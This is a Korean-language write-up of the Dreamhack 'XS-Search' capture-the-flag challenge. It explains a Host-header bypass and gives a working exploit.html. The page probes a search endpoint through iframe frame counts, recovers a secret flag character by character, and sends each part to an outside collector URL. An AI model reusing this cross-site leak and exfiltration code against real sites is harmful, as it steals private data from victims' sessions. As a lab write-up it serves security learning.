 # Challenge: dreamhack - XS-Search

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/443

## 추가 학습
### iframe
* iframe 요소는 문서 내에 별도의 독립적인 브라우징 창을 만들어 다른 문서나 페이지를 로드할 수 있게 한다.
* ifrmae.contentWindow는 해당 iframe이 가진 window 객체를 참조한다. iframe은 HTML 문서 내의 iframe 요소 그 자체를 가리키는 것이고 iframe.contentWindow는 iframe 내부의 window 객체, 즉 iframe 자체의 브라우저 창을 의미한다. 따라서 window 객체는 그 안에 또 다른 frame이 있을 수 있다.
* frames는 현재 윈도우 객체 내에 포함된 모든 하위 프레임들의 배열과 같은 객체이다.
* iframe.contentWindow.frames.length는 그 iframe 내부에 몇 개의 하위 프레임이 존재하는지를 나타낸다.

## 문제 풀이
step 1
* app.py부터 분석해보자. query 값을 받아 notes 안에 값이 있는지를 확인한다. 
    ```python
    notes = {
        (FLAG, True), 
        ("Hello World", False), 
        ("DreamHack", False), 
        ("carpe diem, quam minimum credula postero", False)
    }

    @app.route('/search')
    def search():
        query = request.args.get('query', None)
        if query == None:
            return render_template("search.html", query=None, result=None)
        for note, private in notes:
            if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
                continue
            if query != "" and query in note:
                return render_template("search.html", query=query, result=note)
        return render_template("search.html", query=query, result=None)
    ```
    * FLAG는 private이 True로 설정되어 있다. reqeust.remote_addr로 클라이언트의 IP 주소와 request.headers.get("HOST")로 클라이언트에서 지정한 HTTP 요청의 host 헤더 값이 127.0.0.1인지를 검증하므로 로컬에서 접근해야 한다. 반대로 request.remote_addr이나 request.headers.get("HOST") 둘 중. ㅏ나라도 127.0.0.1이 되면 다음 if 문에 진입한다. 바로 burp suite로 host 값을 변경하여 플래그의 예상 일부분인 "DH"를 입력해 get 요청을 보냈더니 flag가 나온다. ..? 하지만 제목이 XS-Search이므로 해당 풀이는 언인텐으로 보인다. XS-Search에 집중해서 풀어보자. 

* search.html을 보자.
    ```html
    {% extends "base.html" %}
    {% block title %}Search{% endblock %}

    {% block head %}
    {{ super() }}
    {% endblock %}

    {% block content %}
    <h2>Search</h2><br/>
    {% if result %}
    <h3>Searching "{{ query }}" found</h3>
    <iframe srcdoc="<pre>{{ result }}</pre>"></iframe>
    {% elif query %}
    <h3> Searching "{{ query }}" not found</h3>
    {% else %}
    <form method="GET" class="form-inline">
        <div class="form-group">
            <label class="sr-only" for="query">/</label>
            <div class="input-group">
                <div class="input-group-addon">Query: </div>
                <input type="text" class="form-control" id="query" name="query" placeholder="DreamHack">
            </div>
        </div>
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
    {% endif %}
    {% endblock %}
    ```
    * query와 result를 search.html에 반환하는데, result 변수가 notes에 존재하면(참) ```<iframe srcdoc="<pre>{{ result }}</pre>"></iframe>```으로 iframe을 만들어 결과를 출력한다. 없다면 iframe은 만들지 않는다. 따라서 문서에서 iframe의 개수 차이가 발생한다.

* 플래그를 얻기 위해서는 내부 서버에서 실행하는 read_url이 수반되어야 한다. 따라서 read_url을 호출하는 /submit 엔드포인트를 이용해야 한다. /submit에서는 폼에 입력한 url의 scheme이 http인지, https인지 검증하는 것까지 확인 가능하다. 

step 2
* FLAG를 어떻게 얻어야할까? 구조적으로는 /submit을 거쳐, /search로 FLAG 정보를 얻어야 한다는 것이다. XS-Search는 나의 의도된 서버에 접근시켜 해당 html로 side channel을 이용해 비밀 정보를 알아내는 기법이다. 관리자가 외부 서버에 접근하는 동작이 /submit에 나의 외부 서버 주소를 입력하는 방식이다.
* 그렇다면 행해야 하는 동작은 두 가지이다. 외부 서버를 갖추고, 그 외부 서버에 악성 코드를 작성하는 것. 악성 코드는 /search에 side channel 공격으로 flag 값을 알아내는 코드이다.
* /search에서 값이 달라지는 것은 frame의 개수이다. 관리자가 /search에 get 요청을 보내게 되면 127.0.0.1로 접근하는 것이니 flag의 값 일부분을 가지고 있다면 frame은 1개, 아니라면 0개일 것이다

step 3
* 외부 서버는 github의 page를 이용하자. 악성 코드는 exploit.html에 작성했다. 필자는 이전에 만들어둔 https://ssijin.github.io/static/ 서버가 있어서 index.html 내용을 exploit.html로 덮어씌웠다. 
* exploit.html의 코드를 리뷰해보자. 설정할 태그는 두 개이다. iframe의 개수를 side channel로 사용하니, iframe의 숫자를 확인할 iframe 태그가 필요하고 알아낸 flag를 외부 서버 주소로 보내줄 script 태그가 필요하다. 또는 img 태그도 좋다. 브라우저 입장에서는 비동기 이벤트이므로 함수도 비동기로 작성하고, Promise를 함께 사용한다.
    ```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>테스트 페이지</title>
    </head>
    <body>
        <h1>Hello, GitHub Pages!</h1>
        <iframe id="iframe"></iframe>
        <script id="transport_flag"></script>
        <script>
            async function req(url) {
                return await new Promise((resolve, reject) => {
                    const iframe = document.getElementById("iframe");
                    iframe.src = url;
                    iframe.onload = () => { 
                        if (iframe.contentWindow.frames.length != 0)
                            return resolve();
                        else
                            return reject();
                    };
                });
            }
        
            async function search(query) {
                try {
                    await req(
                    `http://localhost:8000/search?query=${query}`
                    );
                    return true;
                } catch (e) {
                    return false;
                }
            }
        
            async function exploit() {
                let chars = "0123456789abcdef}"
                // let secret = "DH{"
                // let secret = "DH{22d1445ad68";
                 let secret = "DH{22d1445ad68e194e044a16";
 

        
                while (!secret.includes("}")) {
                    for (let c of chars) {
                        if (await search(secret + c)) {
                            secret += c;
                            transport_flag.src = `https://nllnxbb.request.dreamhack.games/flag=${secret}`;
                            break;
                        }
                    }
                }
            }
        
            exploit();
    </script>
    </body>
    </html>
    ```
    * exploit 함수는 문제 설명에서 제시한 플래그의 가능한 모든 후보군에 대해 한 자리씩 루프를 돌며 공격 대상 서버에 search를 보낸다. 그리고 flag의 값을 받을 두 번째 외부 서버 주소를 img.src로 설정한다. HTML ```<img> ```태그는 src 속성을 변경하는 순간 브라우저가 자동으로 해당 URL에 GET 요청을 보낸다. 따라서 search에 성공하면 바로 외부 서버 주소로 flag 값이 같이 넘어간다.
    * search 함수는 req에 localhost:8000을 담는 역할이다.
    * req(url)은 iframe이 onload 이벤트를 발생하면 iframe.contentWindow.frames.length !=0 의 조건으로 성공과 실패 여부를 판단한다. url에 iframe이 있다는 것은 /search에 get으로 보낸 query가 flag의 일부분을 충족했다는 의미이다.
    * 위 코드를 외부 서버 주소에 넣고 /submit 폼에 외부 서버 주소를 입력하면, 해당 코드를 관리자 봇이 접속하면서 exploit 코드가 돌아가고 또 다른 외부 서버 주소(https://nllnxbb.request.dreamhack.games)로 flag를 한글자씩 전송하게 된다. 관리자 봇의 timeout이 3초로 설정되어 있어 플래그를 한 번에 얻을 수는 없다. exploit() 함수의 주석 부분이 여러 번 시도한 흔적이다.

## 결과
iframe의 개수를 side channel로 두고, 외부 서버에 공격 코드를 올려두자. 공격 코드는 exploit.html에 나와있다. /submit의 폼에 해당 서버의 주소를 입력하면 transport_flag.src = `https://nllnxbb.request.dreamhack.games/flag=${secret}`;에서 설정한 주소로 flag를 얻어낼 수 있다. 물론 여러 번 시도해야 한다.